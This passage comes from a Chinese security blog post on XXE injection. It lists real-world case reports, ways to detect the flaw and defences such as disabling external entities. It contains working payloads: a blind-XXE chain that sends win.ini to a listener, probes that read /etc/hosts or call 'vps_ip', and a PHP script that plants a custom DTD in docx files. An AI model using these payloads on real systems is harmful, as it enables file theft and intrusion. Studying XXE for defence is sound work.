</span></span><span style=display:flex><span>$s<span style=color:#f92672>=&lt;&lt;&lt;</span><span style=color:#a6e22e>string</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!</span><span style=color:#a6e22e>DOCTYPE</span> <span style=color:#a6e22e>a</span> [<span style=color:#f92672>&lt;!</span><span style=color:#a6e22e>ENTITY</span> <span style=color:#f92672>%</span> <span style=color:#a6e22e>xxe</span> <span style=color:#a6e22e>SYSTEM</span> <span style=color:#e6db74>&#34;http://127.0.0.1:8088/xxe.txt&#34;</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>%</span><span style=color:#a6e22e>xxe</span>;]<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>string</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>simplexml_load_string</span>($s);
</span></span><span style=display:flex><span><span style=color:#75715e>/* // http://127.0.0.1:8088/xxe.txt:
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % x &#39;&lt;!ENTITY &amp;#37; send SYSTEM &#34;http://127.0.0.1:8088/%file;&#34;&gt;&#39;&gt; %x;
</span></span></span><span style=display:flex><span><span style=color:#75715e>%send;
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=真实案例>真实案例<a hidden class=anchor aria-hidden=true href=#真实案例>#</a></h1><ul><li>在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发。<ul><li>WooYun-2014-73321（网易邮箱某处XXE可读取文件）</li><li>WooYun-2014-73439（QQ邮箱XXE可读取任意文件）</li><li>&mldr;&mldr;</li></ul></li><li>直接处理POST XML数据。WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）等很多。许多是直接 <code>simplexml_load_string</code> 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。</li><li>XML处理工具<ul><li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。</li><li>WooYun-2015-134057（百度某平台Blind XXE漏洞&可Bool型SSRF攻击）XML检查工具。</li><li>WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具</li></ul></li><li>WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。</li><li>WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。</li><li>WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。</li><li>WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）登陆与重置密码时使用XML传输数据。</li><li>WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。</li><li>WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 <code>content-type</code> 来区别对待提交的数据。<code>application/x-www-form-urlencoded</code> 、<code>application/json</code> 、<code>application/xml</code> 被用不同的方式解析。XML直接调用 <code>simplexml_load_string</code> 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。</li><li>WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 <code>关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。</code> ，我觉得有道理。<code>xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生</code> 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。</li><li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件<code>/home/run/ssh_go.sh</code> ，内含SSH登陆密码 orz。</li><li>一些其他案例<ul><li><a href=https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution>XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook&rsquo;s servers</a> 【Facebook OpenID功能点的XRDS XXE】<ul><li><a href=https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/>Revisting XXE and abusing protocols</a> 的分析者利用该原理在其他OpenID平台结合expect模块实现了RCE。</li></ul></li><li><a href=https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745>XXE on Windows system …then what ??</a> 【XXE+SMB=>内网RCE】</li><li><a href=https://xz.aliyun.com/t/2448>Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a></li><li><a href=https://hackerone.com/reports/395296>Phone Call to XXE via Interactive Voice Response</a> 【打个电话也能XXE :)】</li></ul></li></ul><h1 id=发现xxe>发现XXE<a hidden class=anchor aria-hidden=true href=#发现xxe>#</a></h1><p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p><ul><li>单双引号 <code>' "</code> 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li><li>尖括号<code>&lt; ></code>。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li><li>注释符 <code>&lt;!--</code> 。XML使用 <code>&lt;!-- This is a comment --></code> 作注释。</li><li><code>&</code> 。& 用于引用实体。</li><li>CDATA 分隔符<code>]]></code> 。<code>&lt;![CDATA[foo]]></code> 中的内容不被parser解析，提前闭合引发异常。</li></ul><p>尝试利用实体和DTD。</p><ul><li>引用外部DTD文件访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM "http://127.0.0.1:2333"></code> （看响应时间）</li><li>引用外部DTD文件访问外网。<code>&lt;!DOCTYPE a SYSTEM "http://vps_ip" ></code></li><li>引用内部实体。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe "findneo">]>&lt;a>&amp;xxe;&lt;/a></code></li><li>外部实体读本地文件。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM "file:///etc/hosts">]>&lt;a>&amp;xxe;&lt;/a></code></li><li>外部实体访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM "http://192.168.1.2:80"> </code>（看响应时间）</li><li>外部实体访问外网。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM "http://vps_ip">]>&lt;a>&amp;xxe;&lt;/a></code></li><li>判断问题存在可以OOB提取数据。</li></ul><h1 id=生成恶意word文档>生成恶意Word文档<a hidden class=anchor aria-hidden=true href=#生成恶意word文档>#</a></h1><p>上面提到的多个案例都需要用到自定义DTD的docx文件，有个名为 <a href=https://buer.haus/xxegen/>XXEGen</a> 的在线网站可以方便地生成和监听（也可自定义监听地址），从而方便快速地测试XXE是否存在，但目前看来还不支持自定义DTD，如果需要用到OOB之类的技术，可能就不太方便。</p><p>所以我写了个小脚本，可以用来生成一个正常docx文件，然后注入自定义的DTD和实体引用。另外新版的word软件默认禁用DTD，trigger 函数还可以本地测试下word文件是否有问题。</p><p>其实修改 docx 文件的原理很简单，手动也可以做。解压 demo.docx 到 demo文件夹 ，直接修改 <code>demo/word/document.xml</code> 文件内容，全选 demo 文件夹中的文件，使用 7zip 的仅存储方式压缩成 demo2.docx 即可。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-45>45</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// by https://github.com/findneo
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>genword</span>($filename,$filecontent){
</span></span><span style=display:flex><span>    $word <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>COM</span>(<span style=color:#e6db74>&#34;word.application&#34;</span>) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Unable to instantiate Word&#34;</span>);
</span></span><span style=display:flex><span>    $word<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Visible</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;<span style=color:#75715e>//保持程序在后台运行
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $word<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Documents</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Add</span>();<span style=color:#75715e>//新建Word文档
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $word<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Selection</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>TypeText</span>($filecontent);<span style=color:#75715e>//写入指定内容
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $word<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Documents</span>[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SaveAs</span>(<span style=color:#a6e22e>getcwd</span>()<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>.</span>$filename);<span style=color:#75715e>//保存到指定路径
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $word<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Quit</span>();<span style=color:#75715e>//退出程序
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>poisonWord</span>($filename,$flag,$dtd,$entity_reference) {
</span></span><span style=display:flex><span>    $zip <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ZipArchive</span>();
</span></span><span style=display:flex><span>    $zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>open</span>($filename);
</span></span><span style=display:flex><span>    $xml<span style=color:#f92672>=</span>$zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getFromName</span>(<span style=color:#e6db74>&#39;word/document.xml&#39;</span>);
</span></span><span style=display:flex><span>    $prolog<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;&#39;</span>;
</span></span><span style=display:flex><span>    $evilxml<span style=color:#f92672>=</span><span style=color:#a6e22e>str_replace</span>([$prolog,$flag],[$prolog<span style=color:#f92672>.</span>$dtd,$flag<span style=color:#f92672>.</span>$entity_reference],$xml);<span style=color:#75715e>//构造恶意XML
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>deleteName</span>(<span style=color:#e6db74>&#39;word/document.xml&#39;</span>);
</span></span><span style=display:flex><span>    $zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#34;word/document.xml&#34;</span>,$evilxml);<span style=color:#75715e>//更新docx文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>trigger</span>($filename){
</span></span><span style=display:flex><span>    $zip <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ZipArchive</span>();
</span></span><span style=display:flex><span>    $zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>open</span>($filename);
</span></span><span style=display:flex><span>    $xml<span style=color:#f92672>=</span>$zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getFromName</span>(<span style=color:#e6db74>&#39;word/document.xml&#39;</span>);
</span></span><span style=display:flex><span>    $doc_xml <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DOMDocument</span>();
</span></span><span style=display:flex><span>    $doc_xml<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>loadXML</span>($xml); <span style=color:#75715e>//加载word文档
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $zip<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $doc_xml<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>textContent</span>; <span style=color:#75715e>//读取文档内容
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//在这里定义想要添加的DTD内容和想要在XML中引用的实体
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$dtd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe  SYSTEM &#34;http://127.0.0.1:8088/?findneo&#34;&gt;&lt;!ENTITY int &#34;XXE&#34;&gt;]&gt;&#39;</span>;
</span></span><span style=display:flex><span>$entity_reference<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&amp;xxe; &amp;int; IS EXCITING!&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;demo.docx&#34;</span>;<span style=color:#75715e>//生成文件的文件名
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$flag<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Across the Great Wall we can reach every corner in the world.&#34;</span>;<span style=color:#75715e>//文件内容，实体在该内容附近引用。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>genWord</span>($name,$flag);<span style=color:#75715e>//生成一个指定内容和文件名的正常docx文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>poisonWord</span>($name,$flag,$dtd,$entity_reference);<span style=color:#75715e>//向正常文件注入DTD和实体引用，生成恶意文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>trigger</span>($name);<span style=color:#75715e>//加载文件，测试效果
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>//若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径
</span></span></span><span style=display:flex><span><span style=color:#75715e>//extension=&#34;php_com_dotnet.dll 路径&#34;; extension=&#34;php_mbstring.dll 路径&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>此外，Github项目 <a href=https://github.com/BuffaloWill/oxml_xxe><strong>oxml_xxe</strong></a> 支持更多文件类型。</p><h1 id=防御>防御<a hidden class=anchor aria-hidden=true href=#防御>#</a></h1><p>彻底禁用DTD是最好的，退一步，禁用外部实体/外部DTD也可以。具体参考 <a href=https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet>XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a> 。</p><ul><li>禁用外部实体 ( <a href=http://cn2.php.net/libxml_disable_entity_loader>http://cn2.php.net/libxml_disable_entity_loader</a> 等)<ul><li>对于PHP来说，尽管不同环境下<code>simplexml_load_string()</code> 默认行为并不一致，但为了安全应当总是<code>libxml_disable_entity_loader();</code> 。</li></ul></li><li>检验数据来源，过滤数据</li></ul><p>PHP及其他语言或框架，是否默认解析外部实体，解析方式和在特定场景下的解析表现，与其使用的 libxml2 版本有关（如果是基于libxml2的话），也与XML解析器及其配置有关。就PHP而言，<code>libxml2 Version</code> 可以在phpinfo里看，本文使用的是<code>2.7.8</code> 。</p><p>这可能是一个误解的结果。</p><blockquote><p>在slimphp2中，官方是对这块进行一定处理了（。。。一些代码。。。）不知为何在3.0版本中官方就无视这个问题了。 我猜可能有两个原因：</p><p>1.官方注意到了这个问题，但认为3.0版本需求的php版本在5.5以上，而错以为5.5以上的php就已经不存在XXE的隐患了。但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。</p><p>2.官方尚未注意到这个问题。</p><p>感觉前者的可能性较大。</p><p>—— wooyun-2015-0156208</p></blockquote><p>可以结合 <a href=http://www.xmlsoft.org/news.html>change log</a> 和 <a href=https://github.com/GNOME/libxml2/commits>GitHub commit</a> 了解 libxml2 各版本具体改动。</p><p>可以看到与主题较相关的有：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>v2</span><span style=color:#f92672>.</span><span style=color:#ae81ff>9.5</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Sep</span> <span style=color:#ae81ff>04</span> <span style=color:#ae81ff>2017</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Security</span><span style=color:#f92672>:</span><span style=color:#a6e22e>Detect</span> <span style=color:#a6e22e>infinite</span> <span style=color:#a6e22e>recursion</span> <span style=color:#a6e22e>in</span> <span style=color:#a6e22e>parameter</span> <span style=color:#a6e22e>entities</span> (<span style=color:#a6e22e>Nick</span> <span style=color:#a6e22e>Wellnhofer</span>)
